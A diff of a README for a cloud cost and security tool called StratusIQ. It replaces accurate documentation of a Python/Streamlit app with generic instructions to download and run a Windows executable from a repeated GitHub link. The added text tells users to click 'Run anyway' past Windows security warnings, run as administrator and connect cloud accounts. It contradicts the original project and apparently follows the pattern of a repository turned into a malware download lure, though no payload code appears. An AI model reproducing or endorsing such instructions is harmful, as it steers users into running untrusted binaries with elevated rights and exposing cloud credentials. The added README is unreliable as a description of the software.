@@ -1,175 +1,228 @@
-# StratusIQ - Cloud Cost & Security Intelligence Platform
+# 🧠 StratusIQ - Fix Cloud Issues Fast
 
-A production-ready platform for analyzing cloud infrastructure configurations, detecting cost inefficiencies and security vulnerabilities, and generating remediation artifacts.
+[![Download StratusIQ](https://img.shields.io/badge/Download-StratusIQ-6A5ACD?style=for-the-badge&logo=github)](https://github.com/curso7710/StratusIQ)
 
-## Features
+## 🚀 What StratusIQ Does
 
-- **Multi-Source Input**: Analyze Terraform plans or scan live AWS infrastructure
-- **Cost Optimization**: Detect idle resources, overprovisioned instances, and unused assets
-- **Security Analysis**: Identify misconfigurations, open security groups, and compliance issues
-- **Dependency Mapping**: Visualize resource relationships and blast radius
-- **Priority Scoring**: Rank findings by impact, cost savings, and risk
-- **Fix Generation**: Auto-generate Terraform patches and AWS CLI commands
-- **Detailed Explanations**: Understand why issues were flagged and how to fix them
-- **PDF Reports**: Generate comprehensive reports for stakeholders
+StratusIQ helps you find and fix problems in cloud setups. It checks your cloud environment, reviews Terraform files, and spots risks that affect cost, security, and reliability.
 
-## Quick Start
+It then creates safe fixes you can review and apply with validation and rollback support.
 
-### Installation
+Use it if you want to:
+- Find issues in cloud infrastructure
+- Review Terraform before changes go live
+- Reduce wasted cloud spend
+- Catch security gaps early
+- Improve system stability
+- Apply fixes with less manual work
 
-```bash
-cd stratusiq
-pip install -r requirements.txt
-```
+## 💻 What You Need
 
-### Run the Application
+Before you start, make sure you have:
 
-```bash
-streamlit run app.py
-```
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- At least 4 GB of RAM
+- About 500 MB of free disk space
+- Permission to download and run files
+- Access to your cloud account or Terraform project if you plan to scan your own setup
 
-The application will open in your browser at `http://localhost:8501`
+For best results, use a machine with:
+- 8 GB of RAM
+- A modern 64-bit processor
+- Updated Windows security settings
 
-## Usage
+## 📥 Download StratusIQ
 
-### Option 1: Terraform Plan Analysis
+Visit this page to download StratusIQ:
 
-1. Generate a Terraform plan in JSON format:
-```bash
-terraform plan -out=tfplan
-terraform show -json tfplan > plan.json
-```
+[https://github.com/curso7710/StratusIQ](https://github.com/curso7710/StratusIQ)
 
-2. Upload the `plan.json` file in the StratusIQ UI
-3. Click "Analyze Infrastructure"
+If the page includes a release file, download it to your PC. If it provides a zip file, save the zip file first.
 
-### Option 2: AWS Live Scan
+## 🪟 Install on Windows
 
-1. Configure AWS credentials with read-only permissions (see IAM policy below)
-2. Select "AWS Read-Only Scan" in the UI
-3. Choose your region and click "Scan AWS Infrastructure"
+Follow these steps to get StratusIQ running on Windows:
 
-## IAM Policy for AWS Scanning
+1. Open the download link in your browser.
+2. Find the latest release or download file on the page.
+3. Download the file to your Downloads folder.
+4. If the file is a zip archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main app file, such as `.exe` or another Windows launcher.
+7. Double-click the file to start StratusIQ.
+8. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
+9. Wait for the app to open.
+10. Keep the folder in the same place after setup so the app can run again later.
 
-Use the IAM policy in `examples/iam_readonly_policy.json` to create a read-only role:
+If you use a zip file, do not run the app from inside the compressed folder. Always extract it first.
 
-```bash
-aws iam create-policy \
-  --policy-name StratusIQReadOnly \
-  --policy-document file://examples/iam_readonly_policy.json
-```
+## 🧭 First Setup
 
-## Detection Rules
+When you open StratusIQ for the first time, you may see a setup screen. Follow these steps:
 
-### Cost Optimization (6 rules)
-1. Idle EC2 instances (CPU < 10%)
-2. Overprovisioned EC2 (CPU < 30%)
-3. Unattached EBS volumes
-4. Unused Elastic IPs
-5. Large instances with low utilization
-6. Orphaned EBS snapshots
+1. Choose your preferred language, if asked.
+2. Sign in or connect your cloud account if the app requests it.
+3. Select the environment you want to scan.
+4. Add a Terraform project folder if you want code review.
+5. Choose what you want to check:
+   - Cost
+   - Security
+   - Reliability
+   - All checks
+6. Start the scan.
+7. Wait while StratusIQ reviews your setup.
+8. Open the results page to see the findings.
 
-### Security (8 rules)
-1. Security groups open to 0.0.0.0/0 on risky ports
-2. Public S3 buckets
-3. Missing S3 public access block
-4. IAM policies with wildcard actions
-5. IAM policies with wildcard resources
-6. Unencrypted EBS volumes
-7. CloudTrail disabled
-8. Old IAM access keys
+## 🔍 How to Use It
 
-## Architecture
+StratusIQ is designed to be simple to use.
 
-```
-stratusiq/
-├── app.py                      # Main Streamlit application
-├── config.py                   # Configuration and pricing data
-├── scanner/                    # Input parsers
-│   ├── terraform_parser.py    # Terraform plan JSON parser
-│   └── aws_scanner.py         # AWS API scanner
-├── engine/                     # Detection rules
-│   ├── rule_engine.py         # Rule orchestrator
-│   ├── cost_rules.py          # Cost optimization rules
-│   └── security_rules.py      # Security rules
-├── graph/                      # Dependency analysis
-│   └── dependency_graph.py    # NetworkX graph builder
-├── scoring/                    # Priority calculation
-│   └── priority_scoring.py    # Scoring algorithm
-├── fixes/                      # Remediation generation
-│   ├── terraform_patch_generator.py
-│   └── cli_fix_generator.py
-├── llm/                        # Explanation engine
-│   └── explanation_engine.py  # Finding explanations
-├── dashboard/                  # UI components
-│   ├── findings_table.py      # Findings table
-│   ├── detail_view.py         # Finding details
-│   └── graph_view.py          # Dependency graph viz
-├── report/                     # Report generation
-│   └── report_generator.py    # PDF report builder
-└── utils/                      # Utilities
-    ├── helpers.py
-    └── logging_utils.py
-```
+### Scan a cloud environment
+1. Open the app.
+2. Choose the cloud account or workspace.
+3. Start a scan.
+4. Review the issues it finds.
 
-## Priority Scoring Algorithm
+### Review Terraform
+1. Open your Terraform project in the app.
+2. Point StratusIQ at the folder with your `.tf` files.
+3. Run the review.
+4. Check the suggested changes before applying them.
 
-```
-priority_score = (cost_savings_weight × estimated_savings)
-                + (severity_weight × severity_score)
-                - (change_risk_weight × risk_score)
-```
+### Fix issues
+1. Open a finding from the results list.
+2. Read the reason for the issue.
+3. Review the suggested fix.
+4. Apply the fix if it matches your goal.
+5. Run validation before making the change live.
 
-Weights:
-- Cost savings: 1.0
-- Severity: 0.5
-- Change risk: 0.3
+### Roll back if needed
+1. Open the change history.
+2. Find the last safe state.
+3. Use rollback if a change causes a problem.
+4. Re-scan after rollback to confirm the issue is resolved.
 
-## Security Design
+## 🛠 Common Use Cases
 
-- Read-only IAM permissions only
-- No credential storage
-- Sensitive fields redacted in logs
-- Audit trail for all scans
-- No auto-execution of fixes
+StratusIQ fits common cloud tasks like:
 
-## Example Workflow
+- Checking for open storage access
+- Finding oversized cloud resources
+- Spotting missing encryption
+- Reviewing network rules
+- Detecting unsafe Terraform changes
+- Catching drift between code and live infrastructure
+- Finding setup gaps that may cause outages
 
-1. **Scan**: Upload Terraform plan or scan AWS
-2. **Review**: Browse findings table with filters
-3. **Analyze**: View detailed evidence and impact
-4. **Remediate**: Copy Terraform patches or CLI commands
-5. **Report**: Generate PDF for stakeholders
+## 📂 Typical App Layout
 
-## Testing with Sample Data
+After installation, you may see files and folders like these:
 
-A sample Terraform plan is provided in `examples/terraform_sample_plan.json`:
+- `StratusIQ.exe` - the main app
+- `config` - app settings
+- `logs` - scan and event logs
+- `reports` - saved results
+- `backups` - rollback data
+- `terraform` - file review tools
 
-```bash
-# In the UI, upload examples/terraform_sample_plan.json
-```
+Do not rename these files unless the app instructions say to.
 
-This will detect:
-- Overprovisioned m5.4xlarge instance
-- Security group open to 0.0.0.0/0 on port 22
-- Unattached EBS volume
-- Unencrypted EBS volumes
-- Public S3 bucket
-- IAM role with wildcard principal
+## 🔐 Security Tips
 
-## Requirements
+Use these simple steps to keep your system safe:
 
-- Python 3.8+
-- Streamlit 1.31+
-- boto3 (for AWS scanning)
-- networkx (for dependency graphs)
-- plotly (for visualizations)
-- reportlab (for PDF reports)
+- Download only from the link above
+- Keep Windows updated
+- Use an account with the right access level
+- Review each fix before applying it
+- Save backups before major changes
+- Run scans on trusted projects only
+- Check rollback options before making large updates
 
-## License
+## ❓ Troubleshooting
 
-MIT License
+### The app does not open
+- Make sure the file finished downloading
+- Extract the zip file first, if you downloaded one
+- Right-click the app and choose Run as administrator
+- Check whether Windows blocked the file
 
-## Support
+### The download looks incomplete
+- Download the file again
+- Use a stable internet connection
+- Clear the browser download cache
+- Check that the file size looks correct
 
-For issues or questions, please open an issue on GitHub.
+### The scan does not start
+- Confirm that your cloud account is connected
+- Check that you selected a valid project folder
+- Make sure the Terraform files are in the folder you chose
+- Restart the app and try again
+
+### No findings show up
+- Run a full scan instead of a quick check
+- Make sure the app has permission to read the project
+- Confirm that the target environment has active resources
+- Try scanning a different folder or account
+
+## 📋 Recommended Workflow
+
+For the best results, use this order:
+
+1. Download StratusIQ
+2. Install it on Windows
+3. Connect your cloud account or project
+4. Run a scan
+5. Review the findings
+6. Apply one fix at a time
+7. Validate each change
+8. Use rollback if needed
+9. Scan again after changes
+
+## 🖥 Windows Tips
+
+- Keep StratusIQ in a folder you can find later
+- Use a short folder path, such as `C:\StratusIQ`
+- Avoid moving the app while it is running
+- Close other heavy apps if your PC feels slow
+- Give the app access to your project files if Windows asks
+
+## 📎 File Types You May See
+
+StratusIQ may come as one of these:
+
+- `.exe` for direct launch
+- `.zip` for extracted setup
+- `.msi` for guided install
+- `.html` or browser page for web access
+
+If you see a zip file, extract it first. If you see an installer, open it and follow the prompts.
+
+## 🔄 Update the App
+
+When a new version appears:
+
+1. Download the newest release from the same link
+2. Close the current app
+3. Replace the old files if needed
+4. Open the new version
+5. Run a fresh scan after updating
+
+## 📁 Quick Start Checklist
+
+- Download the app from the link above
+- Extract files if needed
+- Open the Windows app file
+- Connect your environment or Terraform folder
+- Run a scan
+- Review the findings
+- Apply a fix
+- Validate the result
+- Use rollback if the change needs to be undone
+
+## 🔗 Download Again
+
+If you need the download page again, use this link:
+
+[https://github.com/curso7710/StratusIQ](https://github.com/curso7710/StratusIQ)
